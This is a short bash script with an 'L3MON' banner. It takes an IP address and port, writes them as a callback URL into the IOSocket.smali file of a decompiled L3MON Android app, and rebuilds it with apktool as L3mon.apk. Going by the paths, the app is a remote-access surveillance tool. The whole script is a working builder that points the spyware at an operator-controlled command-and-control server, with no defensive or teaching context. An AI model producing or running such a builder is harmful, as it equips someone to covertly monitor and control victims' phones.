#!/bin/bash
echo
echo "******************************"
echo " _     _____ __  __  ___  _   _ 
| |   |___ /|  \/  |/ _ \| \ | |
| |     |_ \| |\/| | | | |  \| |
| |___ ___) | |  | | |_| | |\  |
|_____|____/|_|  |_|\___/|_| \_|"
echo "******************************"
echo
echo -n Your ip :
read ips
echo -n your port :
read ports

echo -e "const-string v3, \"http://$ips:$ports?model=\"" >.lmn.txt
chg=$(cat .lmn.txt)
sed -i "77 c $chg" $HOME/L3MON/server/app/factory/decompiled/smali/com/etechd/l3mon/IOSocket.smali
apktool b $HOME/L3MON/server/app/factory/decompiled/ -o /sdcard/L3mon.apk
